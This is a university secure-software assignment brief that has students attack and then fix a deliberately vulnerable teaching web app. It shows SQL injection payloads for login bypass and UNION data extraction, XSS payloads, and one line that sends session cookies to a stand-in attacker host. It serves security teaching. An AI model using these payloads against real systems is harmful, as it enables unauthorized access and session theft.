> This is the original assignment brief from CYSE 411 (Secure Software
> Engineering, George Mason University), kept for context. See the
> [project README](../README.md) for what was built.

# CYSE 411 · Assignment 3 — Break It, Then Fix It: Securing *GreenThumb*

> Secure Software Engineering · George Mason University
> Units 2.2 (Injection & Input Handling) and 2.3 (Cross-Site Scripting)

## The scenario

**GreenThumb** is a tiny community board where neighbours swap houseplant
cuttings: you can browse listings, search them, log in, and leave comments. It
also happens to be riddled with the exact vulnerability classes we covered in
Units 2.2 and 2.3. A (fictional) client has handed you the code and asked you to
ship a version that a real user could trust.

You will work as both attacker and defender:

1. **Attack** the app to prove each vulnerability is real (you write short
   exploit scripts).
2. **Fix** the app so those same exploits stop working — without breaking any
   feature.

This is the professional loop: you don't get to claim something is fixed until
you can show the attack that used to work now fails.

---

## Learning objectives

By the end you should be able to:

- Explain how an interpreter (a SQL engine, an HTML parser) can be tricked into
  treating attacker-controlled **data** as **instructions**.
- Craft SQL injection payloads for **authentication bypass** and **data
  extraction (UNION)**.
- Craft **reflected**, **stored**, and **DOM-based** XSS payloads.
- Apply the primary defenses: **parameterized queries**, **allow-listing**,
  **output encoding**, **safe DOM APIs**, **cookie hardening**, and a
  **Content-Security-Policy**.
- Argue *why* each defense works, and where each one stops.

---

## Time budget (~8 hours)

This assignment is designed to fit in about **8 hours**. A rough map:

| Phase | Time |
|---|---|
| Setup + read the code | ~0.75 h |
| FIX 1 & FIX 2 — SQL injection (attack + patch) | ~2 h |
| FIX 3 & FIX 4 — XSS (attack + patch) | ~2 h |
| Watch the two short videos | ~0.5 h |
| FIX 5 — cookie hardening + CSP | ~1 h |
| Write-up + publish repo | ~1.25 h |
| Buffer | ~0.5 h |

If you find yourself deep in a rabbit hole (a payload that won't fire, a UNION
column-count mismatch), stop and re-read the hint in the code comment — the
answer is almost always a syntax detail from lecture.

---

## What you will submit

You are **not** uploading files to Canvas. You will publish your own repository
and **submit only its URL** on Canvas.

Your repository must contain:

1. **The secured site** — the whole app, with all five defects fixed and every
   feature still working.
2. **Your exploit scripts** — the completed `exploits/01…04` (plus the provided
   `05`) that demonstrate each attack. See [`exploits/README.md`](exploits/README.md).
3. **`WRITEUP.md`** — a short report (½–1 page per defect is plenty). For each of
   the five defects, cover:
   - the vulnerable line(s) and *why* they were exploitable,
   - the exact payload you used and what it did,
   - the fix you applied and *why* it works,
   - one sentence on the limits of that fix (what it does **not** protect
     against).

> **Do not commit `node_modules/`.** A `.gitignore` is included.

---

## Setup

**Prerequisites:** [Node.js 18 or newer](https://nodejs.org) (`node --version`
to check). No database server and no native build tools are needed — the app
uses `sql.js`, a pure-WebAssembly SQLite that installs the same on Windows,
macOS, and Linux.

```bash
# 1. Clone THIS starter (your instructor will give you the URL)
git clone <starter-repo-url> greenthumb
cd greenthumb

# 2. Install dependencies
npm install

# 3. Run it
npm start
# → GreenThumb (vulnerable build) → http://localhost:3000
```

Open <http://localhost:3000>. Click into a listing, try the search box, and log
in with a seeded account to get a feel for the app:

| Username | Password |
|---|---|
| `fern_hollow` | `sporeprint77` |
| `curator` | `GreenThumb!Root#2024` |

The database is rebuilt in memory every time the server starts, so you can
experiment freely — a restart gives you a clean slate.

---

## How your work will be evaluated (deployment)

Your instructor grades your repo by running it exactly the way you did:

```bash
git clone <your-repo-url> submission
cd submission
npm install
npm start                       # app must come up on http://localhost:3000
npm run exploit                 # your suite must report [SECURE] x5
```

Then the grader manually checks that the site still works (search returns
results, login succeeds with a real password, comments post and display, the
shared-note banner works) and reads your `WRITEUP.md`.

**So your repo must run with nothing but `npm install && npm start`.** If you
add a dependency, add it to `package.json`. If you change the port, say so in
your `WRITEUP.md` (the grader defaults to `3000`).

---

## The map of defects

Everything you must fix is tagged in the source with a `FIX n` comment. Search
the project for `FIX 1`, `FIX 2`, … to jump to each one.

| # | Defect | Where |
|---|---|---|
| **FIX 1** | SQL injection — authentication bypass | `server.js` → `POST /login` |
| **FIX 2** | SQL injection — data extraction (UNION) + unsafe `ORDER BY` | `server.js` → `GET /search` |
| **FIX 3** | Reflected XSS | `server.js` → `GET /search` |
| **FIX 4** | Stored XSS (comments) + DOM-based XSS (shared note) | `server.js` → `GET /listing/:id`; `public/app.js` |
| **FIX 5** | Missing cookie flags + missing Content-Security-Policy | `server.js` → `POST /login` and a global middleware |

The tutorial below walks through them in order. Each part follows the same
rhythm: **understand → attack → extend → fix → verify.**

---
---

# Part 1 — SQL injection

## Concept: the query is a string, and you control part of it

A backend builds a SQL statement and hands it to the database engine to
interpret. When user input is glued into that string, the engine can't tell
your *data* from the app's *instructions*. Two characters do most of the work:

- `'` — ends a string literal early, so whatever follows is read as SQL, not as
  text.
- `--` — starts a comment; the engine ignores the rest of the line.

A classic authentication-bypass shape looks like this. Given:

```sql
SELECT * FROM accounts WHERE user = '<INPUT>' AND pass = '<INPUT>'
```

an input of `alice' --` turns the statement into:

```sql
SELECT * FROM accounts WHERE user = 'alice' --' AND pass = '...'
```

The `--` comments out the password check entirely, so the row for `alice` comes
back and the app logs you in as her.

## Attack it (FIX 1): log in as `curator` without the password

Open `server.js` and find **FIX 1** in `POST /login`. Read the query it builds.

Now open `exploits/01-sqli-login-bypass.mjs` and replace the `TODO` username
with a payload that comments away the password check for the `curator` account.
(Apply the `alice' --` pattern above to *this* query and *this* username.)

Run it with the app running (`npm start` in another terminal):

```bash
node exploits/01-sqli-login-bypass.mjs
```

You want to see `[VULNERABLE] logged in as "curator" …`. You can also do it by
hand in the browser at <http://localhost:3000/login>.

## Concept: reading data you were never shown (UNION)

`UNION SELECT` staples the rows of a second query onto the first. The catch:
**both SELECTs must return the same number of columns.** If the visible query
returns four columns, your injected `UNION SELECT` must also select four. You
pad with constants (`'x'`, `NULL`) when you don't have four real columns to
show.

Generic shape, against a query that shows two columns:

```sql
SELECT name, price FROM items WHERE name LIKE '%<INPUT>%'
```

Input `nothing%' UNION SELECT card_number, cvv FROM cards -- ` yields:

```sql
SELECT name, price FROM items WHERE name LIKE '%nothing%'
UNION SELECT card_number, cvv FROM cards -- %'
```

…and the app dutifully renders the secret rows next to the products.

## Attack it (FIX 2): dump every username and password via search

Find **FIX 2** in `GET /search`. **Count the columns** the visible query
selects — your `UNION SELECT` must match that count. Then, in
`exploits/02-sqli-union-dump.mjs`, replace the `TODO` with a search term that
UNIONs the `username` and `password` columns out of the `users` table (pad the
remaining columns with constants), and comments out the trailing SQL.

```bash
node exploits/02-sqli-union-dump.mjs        # want: [VULNERABLE] leaked N secret(s)…
```

### Extend it (do this, note it in your write-up)

The `sort` parameter is even more exposed than the search term — it is dropped
straight into `ORDER BY <sort>`, so it is a raw SQL position, not a value.
Visit:

```
http://localhost:3000/search?sort=species
http://localhost:3000/search?sort=title%20DESC
```

and confirm the result order changes. In your write-up, explain in one or two
sentences why this field **cannot** be fixed by parameter binding alone, and
what an attacker could probe for by abusing it (think: expressions that are only
valid against certain tables/columns — a way to ask the database yes/no
questions). You do **not** need to weaponize it; just explain the risk.

## Fix it (FIX 1 and FIX 2)

The defense is the same idea in both places: **stop building executable SQL out
of input.** Send the *values* to the engine separately from the *query text*,
using bound `?` placeholders. The engine then treats them as pure data — even
`' OR 1=1 --` becomes a harmless string it searches for literally.

- **FIX 1 (`POST /login`):** replace the concatenated query with a parameterized
  one that binds `username` and `password`. The helper in `lib/db.js` already
  accepts bound parameters: `get(sql, [a, b])`.
- **FIX 2 (`GET /search`), the search term:** bind the `LIKE` value(s) with `?`.
- **FIX 2, the `ORDER BY`:** you **cannot** bind a column name or a keyword like
  `DESC` — only values. So build an **allow-list**: map the small set of
  sort options you actually support to known-safe SQL fragments, and ignore
  anything else. Never let raw input reach `ORDER BY`.

## Verify

```bash
node exploits/01-sqli-login-bypass.mjs   # now: [SECURE]
node exploits/02-sqli-union-dump.mjs     # now: [SECURE]
```

Then confirm the features still work: a **real** login
(`curator` / `GreenThumb!Root#2024`) still succeeds, search still returns
matching plants, and `?sort=species` still reorders results.

---
---

# Part 2 — Cross-Site Scripting (XSS)

## Concept: your input becomes markup

XSS is injection into the *browser's* HTML/JS interpreter instead of the
database. If a page drops your input into HTML without encoding it, the browser
parses your input as tags and scripts. We will hit all three flavours from
Unit 2.3:

- **Reflected** — the payload rides in the request and is echoed straight back
  in the response (e.g. a search term shown on the results page).
- **Stored** — the payload is saved on the server (e.g. a comment) and served to
  everyone who views the page later. More dangerous: the victim just has to look.
- **DOM-based** — client-side JavaScript reads something (like the URL) and
  writes it into the page with an unsafe API; the server never even sees it.

A note from lecture worth repeating: a bare `<script>…</script>` injected into
an existing page often **won't** run, because the HTML parser treats scripts
inserted that way specially. Event-handler payloads dodge this. The workhorse:

```html
<img src=x onerror=alert(1)>
```

The image fails to load (`src=x`), which fires `onerror`, which runs your JS.

## Attack it (FIX 3): reflected XSS in search

Find **FIX 3** in `GET /search` — the search term is echoed into the results
heading with no encoding. In `exploits/03-reflected-xss.mjs`, replace the `TODO`
with a payload that would execute (use the `<img … onerror=…>` trick, not a raw
`<script>`).

```bash
node exploits/03-reflected-xss.mjs        # want: [VULNERABLE] reflected as live HTML
```

Open the same URL in a browser to watch it actually fire:
`http://localhost:3000/search?q=<img src=x onerror=alert(document.domain)>`.

## Attack it (FIX 4a): stored XSS in comments

Find **FIX 4** in `GET /listing/:id`. Comments are stored exactly as typed and
rendered into every visitor's page. In `exploits/04-stored-xss.mjs`, replace the
`TODO` with a payload (embedding the provided `MARKER` so you can spot it).

```bash
node exploits/04-stored-xss.mjs           # want: [VULNERABLE] served back as live HTML
```

To feel why stored XSS is worse than reflected, think about who runs your
payload: **every** neighbour who opens that listing — not just someone who
clicked your crafted link.

### Why this matters: session theft

The reason a comment running your JavaScript is a big deal is that it runs
*inside the victim's authenticated session*. With the current insecure cookie
(FIX 5), a stored payload like this exfiltrates the victim's session id:

```html
<img src=x onerror="new Image().src='https://evil.example/c?'+document.cookie">
```

Keep this in mind — FIX 5 is what takes the session id off the table even if an
XSS slips through.

## Attack it (FIX 4b): DOM-based XSS in the shared-note banner

Open `public/app.js` and find **FIX 4**. The listing page supports a "shared
note" in the URL fragment, e.g. `…/listing/1#note=hello`, and injects it with
`.innerHTML`. Because the fragment (`#…`) never leaves the browser, this is a
pure client-side bug. Try it live:

```
http://localhost:3000/listing/1#note=<img src=x onerror=alert('dom-xss')>
```

(There is no automated exploit script for this one — verify it in the browser
and describe it in your write-up.)

## Fix it (FIX 3 and FIX 4)

Two complementary techniques, straight from the Unit 2.3 mitigation layers:

- **Output encoding (server side, FIX 3 and FIX 4a).** Before any untrusted
  value goes into HTML, convert the dangerous characters to their entities:
  `<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;`, `"` → `&quot;`, `'` → `&#39;`.
  Write a small `escapeHtml()` helper and run the echoed search term and every
  stored comment (body **and** author) through it. Encoded, `<img …>` shows up
  as visible text instead of a tag.

- **Safe DOM API (client side, FIX 4b).** `.innerHTML` **parses** its input as
  HTML; `.textContent` does not. Rewrite the shared-note code to put the value
  in the page as **text** (assign to `.textContent`, or create a text node),
  and the same markup is shown literally instead of executing.

> Optional, if you want to go further: server-side sanitization with a library
> like **DOMPurify** lets you allow *some* safe HTML (bold, links) while
> stripping scripts. Encoding is the right default here because comments are
> plain text; mention the trade-off in your write-up if you explore it.

## Verify

```bash
node exploits/03-reflected-xss.mjs   # now: [SECURE]
node exploits/04-stored-xss.mjs      # now: [SECURE]
```

…and in the browser, the `#note=<img …>` payload now shows as text, and a normal
comment like *"Trade you for a pothos?"* still displays correctly.

---
---

# Part 3 — Browser-enforced defenses (watch first, then fix)

The last defect is about **defense in depth**: even a perfectly-coded app
benefits from telling the browser to distrust injected content and to guard the
session cookie. Before you implement FIX 5, spend ~25 minutes on these.

### 📺 Watch — Content Security Policy

Watch one of these, then skim the reference:

- **Video:** *Content Security Policy Explained* — <https://www.youtube.com/watch?v=-LjPRzFR5f0>
- **Reference (authoritative):** MDN, *Content Security Policy (CSP)* —
  <https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP>
- **Reference (defensive checklist):** OWASP *Content Security Policy Cheat
  Sheet* — <https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html>

As you watch, answer for yourself: *why is a CSP a **mitigation** for XSS and not
a **fix**?* (Recall from lecture: CSP reduces the impact of injected scripts; it
does not remove the injection.)

### 📺 Watch — Cookies & session tokens

- **Video:** *What are cookies in web development? (HttpOnly, SameSite, Secure)* —
  <https://www.youtube.com/watch?v=32EvjAnKEWY>
- **Reference (authoritative):** MDN, *Set-Cookie* —
  <https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie>
- **Reference (defensive checklist):** OWASP *Session Management Cheat Sheet* —
  <https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html>

As you watch, answer: *which flag stops `document.cookie` from reading the
session id, and which flag stops the cookie from riding along on a cross-site
request?*

## Concept: two headers that change the browser's behaviour

- **Cookie flags** on `Set-Cookie`:
  - `HttpOnly` — JavaScript can no longer read the cookie via `document.cookie`.
    This is what neuters the session-theft payload from Part 2.
  - `SameSite=Strict` (or `Lax`) — the browser won't attach the cookie to
    requests coming from other sites (a CSRF safeguard).
  - `Secure` — the cookie is only sent over HTTPS. (On plain-HTTP `localhost`,
    setting `Secure` would cause the browser to drop the cookie, so enable it
    only behind TLS — see the hint in the code.)
- **Content-Security-Policy** response header — an allow-list telling the browser
  which sources of script/style/etc. it may execute. A policy of
  `script-src 'self'` (with no `'unsafe-inline'`) blocks injected inline scripts
  and inline event handlers like `onerror`, so even an XSS that slipped past your
  encoding won't run.

## Attack it (FIX 5): confirm the app is unprotected

```bash
node exploits/05-hardening.mjs        # want: [VULNERABLE] missing HttpOnly, SameSite, CSP
```

## Fix it (FIX 5)

- **Cookie (FIX 5a, in `POST /login`):** add `HttpOnly` and `SameSite=Strict` to
  the `Set-Cookie` value (and `Secure` conditionally, for HTTPS — see the code
  comment).
- **CSP (FIX 5b):** add a small Express middleware **above your routes** that
  sets `Content-Security-Policy` on every response. This app deliberately keeps
  **all** its JavaScript in `/app.js` and **all** its CSS in `/styles.css` — no
  inline `<script>`, no inline `style=`, no inline `on…=` handlers — so a
  `'self'`-based policy will lock things down **without breaking the site.** A
  good starting policy:

  ```
  default-src 'self'; script-src 'self'; style-src 'self';
  img-src 'self' data:; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
  ```

## Verify

```bash
node exploits/05-hardening.mjs        # now: [SECURE]
```

Then, in the browser DevTools → *Application → Cookies*, confirm the `sid`
cookie shows **HttpOnly ✓** and **SameSite = Strict**, and in the *Network* tab
confirm the `Content-Security-Policy` header is present on responses.

---
---

# Finish line

## Run the whole suite

With every fix in place and the app running:

```bash
npm run exploit
```

You are done when you see **`RESULT: all five defects are closed.`** and the
site still behaves normally.

## Publish your repository and submit

```bash
# from your project folder, AFTER fixing everything and writing WRITEUP.md
git init
git add .
git commit -m "Assignment 3 — secured GreenThumb + exploit suite + write-up"

# create an EMPTY repo on GitHub (or GMU GitLab) first, then:
git remote add origin <your-new-repo-url>
git branch -M main
git push -u origin main
```

Make sure the repo is accessible to your instructor (public, or share it with
the grading account). **On Canvas, submit only the repository URL.**

Double-check before you submit:

- [ ] `npm install && npm start` brings the app up on `http://localhost:3000`
- [ ] `npm run exploit` → all five `[SECURE]`, `RESULT: all five defects are closed.`
- [ ] Search, login (real password), commenting, and the `#note=` banner all work
- [ ] `node_modules/` is **not** committed
- [ ] `WRITEUP.md` covers all five defects (vuln → payload → fix → limits)

## Grading (100 pts)

| Item | Pts |
|---|---|
| FIX 1 — SQLi auth bypass closed (parameterized) | 15 |
| FIX 2 — SQLi extraction closed (binding + `ORDER BY` allow-list) | 20 |
| FIX 3 — Reflected XSS closed (output encoding) | 10 |
| FIX 4 — Stored + DOM XSS closed (encoding + safe DOM API) | 20 |
| FIX 5 — Cookie flags + CSP added | 15 |
| Exploit scripts demonstrate each attack (and now report `[SECURE]`) | 10 |
| `WRITEUP.md` quality (correct reasoning + stated limits) | 10 |
| **Site remains fully functional** (gate: severe deductions if broken) | — |

---

## Notes, ethics, and scope

- **This is a teaching app. Only attack this app, on your own machine.** The
  techniques here are illegal against systems you don't own or have written
  permission to test.
- **Plaintext passwords are intentional scaffolding** so the UNION exercise has
  something to reveal. A real app must store a slow salted hash (bcrypt/argon2),
  never the password. Don't "fix" this — it's out of scope for Assignment 3, but
  note in your write-up that you noticed it.
- Keep your fixes **minimal and targeted**. You should not need to restructure
  the app; each defect has a small, local fix.
- Getting stuck on a payload is normal. Re-read the `FIX n` comment, re-watch the
  relevant 2-minute stretch of lecture, and check the obvious syntax details
  (an unbalanced quote, the wrong UNION column count).

## Reference reading

- OWASP *SQL Injection Prevention Cheat Sheet*
- OWASP *Cross-Site Scripting Prevention Cheat Sheet*
- OWASP *DOM-based XSS Prevention Cheat Sheet*
- MDN *Content Security Policy* and *Set-Cookie*
- PortSwigger Web Security Academy — *SQL injection* and *Cross-site scripting*
